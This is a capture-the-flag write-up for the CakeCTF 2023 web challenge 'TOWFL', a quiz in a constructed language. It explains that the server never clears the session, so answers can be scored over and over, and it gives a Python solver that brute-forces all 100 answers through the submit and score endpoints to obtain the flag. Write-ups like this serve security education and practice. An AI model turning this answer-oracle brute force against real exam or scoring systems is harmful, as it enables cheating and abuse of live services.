# TOWEL

## Description

> Do you speak the language of wolves?
>
> Prove your skill [here](http://towfl.2023.cakectf.com:8888/)!
>
> Attachments: towfl_1522fc6a699ad2ed6345f40f36451c78.tar.gz

<details><summary>Attachment file tree</summary>

```console
$ tree towfl
towfl
├── docker-compose.yml
├── redis
│   ├── Dockerfile
│   └── redis.conf
└── service
    ├── app.py
    ├── Dockerfile
    ├── static
    │   ├── fonts
    │   │   └── hymmnos.ttf
    │   ├── img
    │   │   └── towfl.webp
    │   └── js
    │       └── script.js
    ├── templates
    │   └── index.html
    └── uwsgi.ini

8 directories, 10 files
```

</details>

## Solution

On the server side, since the session is not deleted, we can check the answers as many times as we want.
We can brute force by using this and get all the answers correct.

solver.py

```python
import requests

s = requests.Session()
# s.proxies = {"http": "http://127.0.0.1:8080"}

BASE_URL = "http://127.0.0.1:8888"
# BASE_URL = "http://towfl.2023.cakectf.com:8888"


def main():
    ans = [[-1 for _ in range(10)] for _ in range(10)]

    res = s.post(f"{BASE_URL}/api/start")
    cookies = res.cookies

    current_score = 0
    for i in range(10):
        for j in range(10):
            for k in range(4):
                print(f"{i=}, {j=}, {k=}", end="\r", flush=True)
                ans[i][j] = k
                s.post(f"{BASE_URL}/api/submit", json=ans, cookies=cookies)
                res = s.get(f"{BASE_URL}/api/score", cookies=cookies)
                res = res.json()

                if res["data"]["flag"] != "Get perfect score for flag":
                    print(res)
                    return

                elif res["data"]["score"] == current_score + 1:
                    current_score += 1
                    break


if __name__ == "__main__":
    main()
```


```console
$ python3 solver.py
{'data': {'flag': '"FakeCTF{*** REDACTED ***}"', 'score': 100}, 'status': 'ok'}
```
